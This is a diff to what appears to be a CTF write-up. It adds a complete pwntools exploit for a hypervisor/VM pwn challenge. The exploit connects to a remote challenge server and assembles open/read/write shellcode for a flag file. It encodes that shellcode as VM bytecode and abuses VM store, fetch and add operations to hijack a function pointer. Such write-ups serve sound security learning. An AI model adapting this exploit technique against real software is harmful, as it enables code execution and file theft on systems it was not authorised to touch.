@@ -63,7 +63,107 @@ It is probably suggesting that the only files you can open are the files listed 
 The exp:
 
 ```python
-# in another computer
+from pwn import *
+
+g_local=False
+context.log_level='debug'
+e = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
+store_idx = 0
+
+if g_local:
+	sh = process(['./hypervisor.elf','kernel.bin','ld.so.2','./user.elf'])#env={'LD_PRELOAD':'./libc.so.6'}
+	#sh = process(['ld.so.2', './user.elf'])
+	ONE_GADGET_OFF = 0x4526a
+	UNSORTED_OFF = 0x3c4b78
+	gdb.attach(sh)
+else:
+	ONE_GADGET_OFF = 0x4526a
+	UNSORTED_OFF = 0x3c4b78
+	sh = remote("35.200.23.198", 31733)
+	#ONE_GADGET_OFF = 0x4557a
+
+def get_qword():
+	high = int(sh.recvuntil("\n")) & 0xffffffff
+	low = int(sh.recvuntil("\n")) & 0xffffffff
+	return (high << 0x20) + low
+
+
+def write():
+	return "\x2c"
+def store():
+	return "\x3a"
+def fetch():
+	return "\x3b"
+def push(imm):
+	return str(imm) + "\x01"
+def writed():
+	return "\x2e"
+def rot():
+	return "\x5c"
+def add():
+	return "\x2b"
+
+asmcode = "push rbx\n"
+asmcode += "mov rax,0x67616c66\n" #flag
+asmcode += "push rax\n"
+asmcode += "mov rdi,rsp\n"
+asmcode += "xor rsi,rsi\n"
+asmcode += "mov rax,2\n"
+asmcode += "syscall\n" #open
+asmcode += "mov rdi,rax\n"
+asmcode += "call next\n"
+asmcode += "next: pop rbx\n"
+asmcode += "add rbx,0x300\n"
+asmcode += "mov rsi,rbx\n"
+asmcode += "mov rdx,100\n"
+asmcode += "xor rax,rax\n"
+asmcode += "syscall\n" #read
+asmcode += "mov rsi,rbx\n"
+asmcode += "mov rdi,1\n"
+asmcode += "mov rdx,100\n"
+asmcode += "mov rax,1\n"
+asmcode += "syscall\n" #write
+asmcode += "pop rbx\n"
+asmcode += "pop rbx\n"
+asmcode += "ret\n"
+
+print len(asmcode)
+shellcode = asm(asmcode, arch='amd64')
+
+codelen = len(shellcode)
+
+sh.recvuntil(" choice but keep going down.\n") + "\x90"
+
+vmcode = ""
+
+for i in xrange(0,codelen/4):
+	vmcode += push(u32(shellcode[i*4:i*4+4]))
+	vmcode += push(i)
+	vmcode += store()
+
+vmcode += str(((0x202028 - 0x2020A4) / 4) & 0xffffffff)
+vmcode += rot()
+#vmcode += writed() * (0x98/8) * 2
+idx = codelen/4
+vmcode += push(idx)
+vmcode += store() #store high dword of write
+
+vmcode += push(0x2034A8 - 0x796)
+vmcode += add()
+
+vmcode += push(idx)
+vmcode += fetch()
+
+vmcode += write()
+
+sh.send(vmcode + "\n")
+
+# for x in xrange(0,(0x98/8)):
+# 	print hex(get_qword())
+
+#0x17e50
+
+sh.interactive()
 ```
 
 ## children tcache
